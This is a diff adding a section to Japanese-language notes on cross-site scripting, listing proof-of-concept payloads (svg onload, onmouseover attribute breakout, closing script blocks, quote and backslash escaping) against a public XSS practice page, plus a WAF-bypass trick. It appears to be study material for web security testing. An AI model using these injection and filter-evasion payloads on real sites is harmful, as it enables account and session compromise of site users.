@@ -41,6 +41,67 @@ bタグで囲んだところを良いところで区切ってWAFバイパスを�
 <b><img/src/on<b></b>error=al<b></b>ert(1)></b>
 ```
 
+#### XSSテク
+
+```
+よく使う型
+<svg onload=alert(1) />
+http://brutelogic.com.br/xss.php?a=<svg onload=alert(1)>
+
+記号のフィルタリングがされている場合はタグから抜け出せないからイベントハンドラーを使う  
+以下は入力フィールド上にマウスをポイントすると発火する  
+http://brutelogic.com.br/xss.php?b3=” onmouseover=alert(1)//
+```
+
+```
+
+HTML injectionでブラウザの解析では HTML タグが優先されるため、ブロックを終了して新しいタグを挿入するだけで済む
+
+<script>
+	// HTMLi in Js Block (Single Quotes)
+	var c1 = 'value1';
+
+	// HTMLi in Js Block (Double Quotes)
+	var c2 = "value2";
+
+	// Simple Js Injection (Single Quotes)
+	var c3 = 'value3';
+
+	// Simple Js Injection (Double Quotes)
+	var c4 = "value4";
+
+	// Escaped Js Injection (Single Quotes)
+	var c5 = 'value5';
+
+	// Escaped Js Injection (Double Quotes)
+	var c6 = "value6";
+
+</script>
+
+http://brutelogic.com.br/xss.php?c1=</script><svg onload=alert(1)>
+```
+
+```
+フィルタリングされていて挿入しても以下のようになる場合
+var myVar3 = '><svg onload=alert(1)>';
+
+その場合は、以下のように-で連結することでエスケープできる
+'-alert(1)-'
+var myVar3 = ''-alert(1)-''
+
+ただしこれに対してもバックスラッシュ(\)でフィルターされる場合は無効となる
+以下が無効となる例:
+var myVar5 = '\'-alert(1)-\'';
+
+そのため上手くバックスラッシュを挿入して引用符が切れるようにする
+http://brutelogic.com.br/xss.php?c5=\'-alert(1)//
+↓
+var myVar5 = '\\'-alert(1)//';
+
+
+```
+
+
 #### JavaScriptのホイスティングを利用したXSS
 宣言されていないか存在しないオブジェクトへの参照により、JavaScript パーサーは ReferenceError をスローしてしまい、
 うまくXSSがささらない場合は、既存の関数を再度使用(ホイスティング)してバイパスすることができる  
